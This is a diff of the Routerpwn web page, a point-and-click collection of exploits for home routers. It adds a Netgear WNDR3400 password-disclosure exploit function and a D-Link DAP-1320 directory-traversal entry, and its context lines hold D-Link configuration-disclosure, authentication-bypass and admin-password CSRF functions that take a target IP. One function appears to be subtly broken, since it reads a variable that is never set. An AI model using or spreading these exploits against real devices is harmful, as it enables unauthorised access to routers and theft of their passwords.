@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.15.223</title>
+		<title>Routerpwn 1.15.224</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link rel="shortcut icon" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -350,19 +350,19 @@ function omnipcx_commandexec(ip)
 	document.location="http://"+ip+url;
 }
 
-// D-Link DWL-2100AP - Configuration Disclosure
+//  DWL-2100AP - Configuration Disclosure
 function dwl2100ap_configdisclosure(ip)
 {
     ip = ip || "dlink-dwl-2100ap";
     document.location="http://"+ip+"/cgi-bin/Intruders.cfg";
 }
 
-	// D-Link DSL-2750U - Bypass Auth
-	function dsl2750u_bypassauth(ip)
-	{
-	    ip = ip || "192.168.1.1";
-	    document.location="http://"+ip+"/html/config";
-	}
+// D-Link DSL-2750U - Bypass Auth
+function dsl2750u_bypassauth(ip)
+{
+	ip = ip || "192.168.1.1";
+	document.location="http://"+ip+"/html/config";
+}
 
 // D-Link DIR-615 D3 - Change Admin Password CSRF
 function d615d3_changepass(ip)
@@ -370,6 +370,14 @@ function d615d3_changepass(ip)
 	ip = ip || "192.168.178.155";
 	password = prompt("New Password:");
 	url = "/tools_admin.php?ACTION_POST=1&apply=Save+Settings&admin_name=admin&admin_password1=" + pass + "&admin_password2=" + pass + "&grap_auth_enable_h=0&rt_enable=on&rt_enable_h=1&rt_ipaddr=0.0.0.0&rt_port=8080";
+	document.location="http://"+ip+url;
+}
+
+// Netgear WNDR3400 - Password Disclosure
+function wndr3400_disclosure(ip)
+{
+	ip = ip || "192.168.0.1";
+	url = ":8080/unauth.cgi?id=393087602";
 	document.location="http://"+ip+url;
 }
 
@@ -2899,7 +2907,15 @@ a=a+1
 
 <section id="DLink">
 <h2>D-Link</h2>
-<h3><a href="javascript:img('D-Link DWL 2100AP')">D-Link DAP 1150</a>, <a href="javascript:img('D-Link DWL 2100AP')">DWL 2100AP</a>, <a href="javascript:img('704P')">704P</a>, <a href="javascript:img('DIR-615')">DIR-615</a>, <a href="javascript:img('DSL-500T')">DSL-500T</a>, <a href="javascript:img('DSL-502T')">DSL-502T</a>, <a href="javascript:img('DSL-504T')">DSL-504T</a>, <a href="javascript:img('DSL-562T')">DSL-562T</a>, <a href="javascript:img('DSL-G604T')">DSL-G604T</a>, <a href="javascript:img('DWL-7000AP')">DWL-7000AP</a>, <a href="javascript:img('DWL-7100AP')">DWL-7100AP</a>, <a href="javascript:img('DNS-320')">DNS-320</a>, <a href="javascript:img('DNS-325')">DNS-325</a>, <a href="javascript:img('DSL-2750U')">DSL-2750U</a>, <a href="javascript:img('DWL-2100AP')">DWL-2100AP</a>, <a href="javascript:img('DIR-280')">DIR-280</a>, <a href="javascript:img('DSL-2740B')">DSL-2740B</a>, <a href="javascript:img('DIR-300')">DIR-300</a></h3>
+<h3><a href="javascript:img('D-Link DWL 2100AP')">D-Link DAP 1150</a>, <a href="javascript:img('D-Link DWL 2100AP')">DWL 2100AP</a>, <a href="javascript:img('704P')">704P</a>, <a href="javascript:img('DIR-615')">DIR-615</a>, <a href="javascript:img('DSL-500T')">DSL-500T</a>, <a href="javascript:img('DSL-502T')">DSL-502T</a>, <a href="javascript:img('DSL-504T')">DSL-504T</a>, <a href="javascript:img('DSL-562T')">DSL-562T</a>, <a href="javascript:img('DSL-G604T')">DSL-G604T</a>, <a href="javascript:img('DWL-7000AP')">DWL-7000AP</a>, <a href="javascript:img('DWL-7100AP')">DWL-7100AP</a>, <a href="javascript:img('DNS-320')">DNS-320</a>, <a href="javascript:img('DNS-325')">DNS-325</a>, <a href="javascript:img('DSL-2750U')">DSL-2750U</a>, <a href="javascript:img('DWL-2100AP')">DWL-2100AP</a>, <a href="javascript:img('DIR-280')">DIR-280</a>, <a href="javascript:img('DSL-2740B')">DSL-2740B</a>, <a href="javascript:img('DIR-300')">DIR-300</a>, <a href="javascript:img('DAP-1320')">DAP-1320</a></h3>
+
+<article>
+	<div>04/19/14</div>
+	<div><a href="http://1337day.com/exploit/22159">[+]</a></div>
+	<div><a href="javascript:dap1320_dirtraversal()">D-Link DAP-1320 Wireless Range Extender - Directory Traversal.html</a></div>
+	<div><a href="javascript:dap1320_dirtraversal(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+
 
 <article>
         <div>04/17/14</div>
@@ -3433,7 +3449,14 @@ a=a+1
 </section><br><br><section id="netgear">
 <form name="netdos"></form>
 <h2>Netgear</h2>
-<h3><a href="javascript:img('WNDR4700')">WNDR4700</a>, <a href="javascript:img('WN2000RPTv2')">WN2000RPTv2</a>, <a href="javascript:img('FVS318')">FVS318</a>, <a href="javascript:img('DG632')">DG632</a>, <a href="javascript:img('SSL312 VPN')">SSL312 VPN</a>, <a href="javascript:img('WNR2000')">WNR2000</a>, <a href="javascript:img('WNDAP350')">WNDAP350</a>, <a href="javascript:img('WNAP210')">WNAP210</a>, <a href="javascript:img('WG602')">WG602</a>, <a href="javascript:img('WGR614v9')">WGR614v9</a>, <a href="javascript:img('CG3100D')">CG3100D</a>, <a href="javascript:img('RP614v4')">RP614v4</a><a href="javascript:img('DGND3300v2')">DGND3300v2</a>, <a href="javascript:img('WNR2000v2')">WNR2000v2</a>, <a href="javascript:img('DGN1000')">DGN1000</a>, , <a href="javascript:img('DGN1000B')">DGN1000B</a>, <a href="javascript:img('DGN2200')">DGN2200</a>, <a href="javascript:img('N300')">N300</a>, <a href="javascript:img('Netgear Prosafe')">Prosafe</a></h3>
+<h3><a href="javascript:img('WNDR4700')">WNDR4700</a>, <a href="javascript:img('WN2000RPTv2')">WN2000RPTv2</a>, <a href="javascript:img('FVS318')">FVS318</a>, <a href="javascript:img('DG632')">DG632</a>, <a href="javascript:img('SSL312 VPN')">SSL312 VPN</a>, <a href="javascript:img('WNR2000')">WNR2000</a>, <a href="javascript:img('WNDAP350')">WNDAP350</a>, <a href="javascript:img('WNAP210')">WNAP210</a>, <a href="javascript:img('WG602')">WG602</a>, <a href="javascript:img('WGR614v9')">WGR614v9</a>, <a href="javascript:img('CG3100D')">CG3100D</a>, <a href="javascript:img('RP614v4')">RP614v4</a><a href="javascript:img('DGND3300v2')">DGND3300v2</a>, <a href="javascript:img('WNR2000v2')">WNR2000v2</a>, <a href="javascript:img('DGN1000')">DGN1000</a>, , <a href="javascript:img('DGN1000B')">DGN1000B</a>, <a href="javascript:img('DGN2200')">DGN2200</a>, <a href="javascript:img('N300')">N300</a>, <a href="javascript:img('Netgear Prosafe')">Prosafe</a>, <a href="javascript:img('WNDR3400')">WNDR3400</a></h3>
+
+<article>
+	<div>04/14/14</div>
+	<div><a href="http://www.exploit-db.com/exploits/32883/">[+]</a></div>
+	<div><a href="javascript:wndr3400_disclosure()">Netgear WNDR3400 - Password Disclosure</a></div>
+	<div><a href="javascript:wndr3400_disclosure(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
 
 <article>
 	<div>02/11/14</div>
